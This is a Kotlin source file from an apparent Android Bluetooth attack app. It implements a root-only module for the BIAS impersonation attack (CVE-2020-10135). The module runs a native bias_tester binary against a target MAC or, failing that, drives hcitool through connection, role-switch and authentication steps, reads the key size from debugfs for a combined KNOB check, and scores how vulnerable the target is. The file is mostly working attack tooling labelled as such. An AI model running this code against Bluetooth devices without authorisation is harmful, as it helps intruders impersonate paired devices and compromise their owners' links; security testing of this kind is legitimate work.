package com.hereliesaz.blusnu.data

import android.util.Log
import com.hereliesaz.blusnu.utils.MacValidator
import com.hereliesaz.blusnu.utils.RootExecutor
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow

/**
 * Vulnerability categories for the BIAS attack (CVE-2020-10135).
 *
 * Each value represents a distinct weakness in the Bluetooth Classic
 * authentication procedure that BIAS can exploit to impersonate a
 * previously paired device.
 *
 * Source: Antonioli et al., "BIAS: Bluetooth Impersonation AttackS"
 * (IEEE S&P 2020).
 */
enum class BiasVulnerability(val description: String) {
    SC_NOT_ENFORCED("Device doesn't enforce Secure Connections"),
    ROLE_SWITCH_ACCEPTED("Device accepts role switch during auth"),
    LSC_DOWNGRADE("Device accepts Legacy Secure Connections downgrade"),
    MUTUAL_AUTH_MISSING("Device doesn't enforce mutual authentication")
}

/**
 * Implementation of the BIAS (Bluetooth Impersonation AttackS) attack.
 *
 * This module targets the authentication procedure in Bluetooth Classic
 * (BR/EDR). BIAS (CVE-2020-10135) exploits flaws in the authentication
 * mechanism that allow an attacker to impersonate a previously paired
 * device without possessing the link key. The attack works by exploiting
 * the lack of mutual authentication enforcement, role switching during
 * authentication, and the ability to downgrade from Secure Connections
 * to Legacy Secure Connections.
 *
 * The module first checks for a dedicated native binary (`bias_tester`).
 * If that binary is not present, it falls back to hcitool to create an
 * ACL connection and probe authentication properties including Secure
 * Connections support, role switching, and mutual authentication
 * enforcement.
 *
 * Root is required for all approaches (HCI access, role manipulation).
 * All privileged operations are executed through [RootExecutor].
 */
class BiasModule {

    companion object {
        private const val TAG = "BiasModule"
        private const val BIAS_BINARY_PATH = "/data/local/tmp/bias_tester"

        /**
         * Minimum encryption key size mandated by the Bluetooth SIG after the
         * KNOB disclosure (CVE-2019-9506). Keys shorter than this bypass the
         * specification minimum and indicate a successful key-size downgrade.
         *
         * Used when checking for combined KNOB+BIAS exploitation.
         *
         * Source: Antonioli et al., "The KNOB is Broken" (USENIX Security 2019).
         */
        private const val KNOB_MINIMUM_KEY_BYTES = 7
    }

    /**
     * Checks if the device has root access via [RootExecutor].
     *
     * @return true if a root shell reports uid=0.
     */
    suspend fun checkRoot(): Boolean {
        return RootExecutor.isRootAvailable()
    }

    /**
     * Executes the BIAS attack workflow against the target device.
     *
     * The flow:
     * 1. Validate the MAC address
     * 2. Verify root access (required, no simulation fallback)
     * 3. Check if the native bias_tester binary exists
     * 4. If it exists, run it with the target MAC
     * 5. Otherwise, use hcitool to probe authentication enforcement
     *
     * @param targetDevice The Bluetooth device to attack.
     * @return A Flow of status strings for the UI console.
     */
    fun startAttack(targetDevice: TargetDevice): Flow<String> = flow {
        val mac = MacValidator.requireValid(targetDevice.macAddress)
        emit("Starting BIAS attack (CVE-2020-10135) on ${targetDevice.name ?: mac}")

        // Root is strictly required -- no simulation fallback
        if (!checkRoot()) {
            emit("ERROR: Root access is not available.")
            emit("BIAS requires root for HCI access and role manipulation. Aborting.")
            return@flow
        }
        emit("Root access confirmed.")

        // Check if the dedicated native binary exists
        val binaryCheck = RootExecutor.execute("ls $BIAS_BINARY_PATH")
        val binaryExists = !binaryCheck.startsWith("Error") &&
                !binaryCheck.contains("No such file") &&
                binaryCheck.trim().isNotEmpty()

        if (binaryExists) {
            // Use the native bias_tester binary
            emit("Native bias_tester binary found at $BIAS_BINARY_PATH")
            emit("Executing: $BIAS_BINARY_PATH -t $mac")

            val output = RootExecutor.execute("$BIAS_BINARY_PATH -t $mac")
            // Emit each line of output from the binary
            for (line in output.lines()) {
                if (line.isNotBlank()) {
                    emit(line)
                }
            }

            if (output.startsWith("Error")) {
                emit("bias_tester execution failed.")
            } else {
                emit("bias_tester execution completed.")
            }
        } else {
            // Fallback: use hcitool to probe authentication
            emit("Native binary not found at $BIAS_BINARY_PATH")
            emit("Falling back to hcitool-based authentication probing...")

            executeHcitoolApproach(mac)
        }
    }

    /**
     * Uses hcitool to probe the target device's authentication enforcement.
     *
     * The approach tests the key aspects exploited by BIAS:
     *   1. Read local device features to check Secure Connections support
     *   2. Read remote device features for SC capability
     *   3. Create an ACL connection
     *   4. Attempt role switch during authentication
     *   5. Attempt authentication after role switch
     *   6. Check authentication result for unilateral legacy auth acceptance
     *   7. Read encryption key size (combined KNOB+BIAS check)
     *   8. Evaluate mutual authentication and LSC downgrade susceptibility
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.executeHcitoolApproach(
        mac: String
    ) {
        val detectedVulnerabilities = mutableListOf<BiasVulnerability>()

        // Step 1: Read local device features to check SC support
        emit("--- Step 1: Reading local device features ---")
        emit("Checking Secure Connections support on local adapter...")
        val localFeatures = RootExecutor.execute("hcitool cmd 0x04 0x0003")
        if (localFeatures.startsWith("Error")) {
            emit("Failed to read local features: $localFeatures")
        } else {
            emit("Local features result: ${localFeatures.ifBlank { "(empty)" }}")
            // Check if Secure Connections Host Support bit is set
            if (!localFeatures.contains("Secure Connections")) {
                emit("Local adapter may not support Secure Connections.")
            } else {
                emit("Local adapter supports Secure Connections.")
            }
        }

        // Step 2: Read remote device features
        emit("--- Step 2: Reading remote device features ---")
        emit("Querying remote features for $mac...")
        val remoteFeatures = RootExecutor.execute("hcitool cmd 0x04 0x001B")
        if (remoteFeatures.startsWith("Error")) {
            emit("Failed to read remote features: $remoteFeatures")
            emit("Remote feature query may require an existing connection.")
        } else {
            emit("Remote features result: ${remoteFeatures.ifBlank { "(empty)" }}")
        }

        // Step 3: Create ACL connection
        emit("--- Step 3: Creating ACL connection ---")
        emit("Creating ACL connection to $mac...")
        val ccResult = RootExecutor.execute("hcitool cc $mac")
        if (ccResult.startsWith("Error")) {
            emit("Failed to create ACL connection: $ccResult")
            emit("The target may be out of range, unpaired, or not accepting connections.")
            return
        }
        emit("ACL connection result: ${ccResult.ifBlank { "OK (no output = success)" }}")

        // Step 4: Attempt role switch during authentication
        emit("--- Step 4: Attempting role switch ---")
        emit("Requesting role switch to slave on $mac...")
        val roleResult = RootExecutor.execute("hcitool sr $mac slave")
        if (roleResult.startsWith("Error")) {
            emit("Role switch failed: $roleResult")
            emit("Device may reject role switching (good security posture).")
        } else {
            emit("Role switch result: ${roleResult.ifBlank { "OK" }}")
            emit("FINDING: Device accepted role switch during connection.")
            emit("This allows the attacker to control authentication direction.")
            detectedVulnerabilities.add(BiasVulnerability.ROLE_SWITCH_ACCEPTED)
            Log.w(TAG, "BIAS: Role switch accepted by $mac")
        }

        // Step 5: Attempt authentication after role switch
        emit("--- Step 5: Attempting authentication ---")
        emit("Requesting authentication with $mac...")
        val authResult = RootExecutor.execute("hcitool auth $mac")
        val authSucceeded: Boolean
        if (authResult.startsWith("Error")) {
            emit("Authentication failed: $authResult")
            emit("Device may enforce mutual authentication (good security posture).")
            authSucceeded = false
        } else {
            emit("Authentication result: ${authResult.ifBlank { "OK" }}")
            authSucceeded = true

            // If auth succeeded after role switch, device may accept unilateral legacy auth
            if (detectedVulnerabilities.contains(BiasVulnerability.ROLE_SWITCH_ACCEPTED)) {
                emit("FINDING: Authentication succeeded after role switch.")
                emit("Device may accept unilateral legacy authentication, allowing impersonation.")
                detectedVulnerabilities.add(BiasVulnerability.MUTUAL_AUTH_MISSING)
                Log.w(TAG, "BIAS: Mutual auth not enforced on $mac after role switch")
            }
        }

        // Step 6: Check Secure Connections enforcement
        emit("--- Step 6: Checking Secure Connections enforcement ---")
        emit("Probing Secure Connections enforcement on $mac...")
        val scCheck = RootExecutor.execute("hcitool cmd 0x04 0x000C")
        if (scCheck.startsWith("Error") || scCheck.isBlank()) {
            emit("Could not determine SC enforcement status.")
        } else {
            emit("Feature check result: ${scCheck.ifBlank { "(empty)" }}")
            // If authentication succeeded without SC, device doesn't enforce it
            if (authSucceeded) {
                emit("FINDING: Authentication completed without Secure Connections enforcement.")
                emit("Device does not require SC for authentication, enabling legacy impersonation.")
                detectedVulnerabilities.add(BiasVulnerability.SC_NOT_ENFORCED)
                Log.w(TAG, "BIAS: SC not enforced on $mac")
            }
        }

        // Step 7: Read encryption key size (combined KNOB+BIAS check)
        emit("--- Step 7: Checking encryption key size (KNOB+BIAS) ---")
        emit("Reading negotiated encryption key size from kernel debug filesystem...")
        val keySizeResult = RootExecutor.execute(
            "cat /sys/kernel/debug/bluetooth/hci0/encryption_key_size 2>/dev/null || " +
            "cat /sys/kernel/debug/bluetooth/hci0/link_key_size 2>/dev/null"
        )

        if (keySizeResult.startsWith("Error") || keySizeResult.isBlank()) {
            emit("Key size check unavailable -- requires kernel debug access (debugfs).")
            emit("Ensure debugfs is mounted: mount -t debugfs none /sys/kernel/debug")
        } else {
            val keySizeMatch = Regex("(\\d+)").find(keySizeResult)
            val keySize = keySizeMatch?.groupValues?.get(1)?.toIntOrNull()

            if (keySize != null) {
                emit("Negotiated key size: $keySize bytes")
                evaluateKeySize(keySize, mac)
            } else {
                emit("Could not parse key size from output. Raw output: $keySizeResult")
            }
        }

        // Step 8: Check for LSC downgrade susceptibility
        emit("--- Step 8: Evaluating LSC downgrade susceptibility ---")
        emit("Checking if device accepts Legacy Secure Connections downgrade...")
        val infoResult = RootExecutor.execute("hcitool info $mac")
        if (infoResult.startsWith("Error") || infoResult.isBlank()) {
            emit("Could not retrieve device info for LSC evaluation.")
        } else {
            for (line in infoResult.lines()) {
                if (line.isNotBlank()) emit(line)
            }
            // If device supports SC but authentication succeeded without it,
            // then LSC downgrade is possible
            if (authSucceeded && detectedVulnerabilities.contains(BiasVulnerability.SC_NOT_ENFORCED)) {
                emit("FINDING: Device appears to accept LSC downgrade.")
                emit("Secure Connections capable but authentication succeeded without SC enforcement.")
                detectedVulnerabilities.add(BiasVulnerability.LSC_DOWNGRADE)
                Log.w(TAG, "BIAS: LSC downgrade possible on $mac")
            }
        }

        // Final evaluation
        emitFinalEvaluation(mac, detectedVulnerabilities)
    }

    /**
     * Evaluates the negotiated key size for combined KNOB+BIAS exploitation.
     *
     * A short key combined with BIAS authentication bypass dramatically
     * reduces the effort needed to impersonate a device.
     *
     * Threshold tiers:
     *   < 7  bytes: KNOB-vulnerable -- below Bluetooth SIG mandated minimum
     *   == 7 bytes: At spec minimum -- reduced security
     *   8-15 bytes: Adequate but below maximum
     *   == 16 bytes: Full encryption key size
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.evaluateKeySize(
        keySize: Int,
        mac: String
    ) {
        when {
            keySize < KNOB_MINIMUM_KEY_BYTES -> {
                emit("VULNERABILITY CONFIRMED: Key size $keySize bytes is below the " +
                        "Bluetooth SIG minimum of $KNOB_MINIMUM_KEY_BYTES bytes.")
                emit("Combined KNOB+BIAS: Weak key plus authentication bypass enables " +
                        "trivial impersonation with reduced brute-force effort.")
                Log.w(TAG, "KNOB+BIAS vulnerability confirmed on $mac: key size $keySize bytes")
            }
            keySize == KNOB_MINIMUM_KEY_BYTES -> {
                emit("Key size is exactly $keySize bytes (the specification minimum).")
                emit("Not a KNOB bypass, but operating at the lowest allowed entropy.")
                emit("Combined with BIAS, impersonation cost is reduced.")
            }
            keySize < 16 -> {
                emit("Key size $keySize bytes is above the minimum but below the maximum of 16.")
                emit("Reduced security margin. BIAS impersonation may still succeed " +
                        "regardless of key size if mutual authentication is not enforced.")
            }
            else -> {
                emit("Key size $keySize bytes. Full encryption key size negotiated.")
                emit("No KNOB+BIAS combination. BIAS impersonation depends solely on " +
                        "authentication enforcement weaknesses.")
            }
        }
    }

    /**
     * Emits the final BIAS vulnerability evaluation summarizing all findings.
     *
     * Lists detected vulnerabilities and provides an overall assessment of
     * the target's susceptibility to Bluetooth impersonation attacks.
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.emitFinalEvaluation(
        mac: String,
        vulnerabilities: List<BiasVulnerability>
    ) {
        emit("")
        emit("=== BIAS EVALUATION SUMMARY FOR $mac ===")

        if (vulnerabilities.isEmpty()) {
            emit("No BIAS vulnerabilities detected.")
            emit("Device appears to enforce mutual authentication and Secure Connections.")
            emit("Assessment: NOT VULNERABLE to BIAS (CVE-2020-10135)")
        } else {
            emit("Detected ${vulnerabilities.size} vulnerability indicator(s):")
            for (vuln in vulnerabilities) {
                emit("  - ${vuln.name}: ${vuln.description}")
            }
            emit("")

            // Assess severity based on combination of findings
            val hasMutualAuthMissing = vulnerabilities.contains(BiasVulnerability.MUTUAL_AUTH_MISSING)
            val hasRoleSwitch = vulnerabilities.contains(BiasVulnerability.ROLE_SWITCH_ACCEPTED)
            val hasScNotEnforced = vulnerabilities.contains(BiasVulnerability.SC_NOT_ENFORCED)
            val hasLscDowngrade = vulnerabilities.contains(BiasVulnerability.LSC_DOWNGRADE)

            when {
                hasMutualAuthMissing && hasRoleSwitch && hasLscDowngrade -> {
                    emit("Assessment: HIGHLY VULNERABLE to BIAS (CVE-2020-10135)")
                    emit("Device accepts role switch, does not enforce mutual authentication, " +
                            "and permits LSC downgrade. Full impersonation attack is feasible.")
                }
                hasMutualAuthMissing && hasRoleSwitch -> {
                    emit("Assessment: VULNERABLE to BIAS (CVE-2020-10135)")
                    emit("Device accepts role switch and does not enforce mutual authentication. " +
                            "Impersonation attack is likely feasible.")
                }
                hasScNotEnforced -> {
                    emit("Assessment: POTENTIALLY VULNERABLE to BIAS (CVE-2020-10135)")
                    emit("Device does not enforce Secure Connections. Further testing " +
                            "with a dedicated BIAS tool is recommended.")
                }
                else -> {
                    emit("Assessment: PARTIALLY VULNERABLE to BIAS (CVE-2020-10135)")
                    emit("Some indicators detected but full attack chain not confirmed. " +
                            "Further analysis recommended.")
                }
            }
        }

        emit("=== END OF BIAS EVALUATION ===")
    }
}
